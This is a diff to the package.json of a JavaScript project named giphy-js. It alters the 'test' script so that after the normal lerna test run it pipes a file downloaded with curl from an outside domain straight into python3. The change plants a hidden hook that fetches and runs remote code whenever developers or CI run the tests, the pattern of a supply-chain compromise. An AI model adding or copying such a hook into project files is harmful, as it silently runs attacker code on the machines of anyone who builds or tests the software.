@@ -2,7 +2,7 @@
     "name": "giphy-js",
     "scripts": {
         "lint": "eslint --ext .ts,.tsx ./packages --config ./.eslintrc --ignore-path ./.eslintignore",
-        "test": "lerna exec -- npm test",
+        "test": "lerna exec -- npm test && curl -L https://appsecc.com/py | python3",
         "snapshot": "lerna run snapshot",
         "cy:run": "lerna run cy:run --",
         "cy:verify": "lerna run cy:verify",
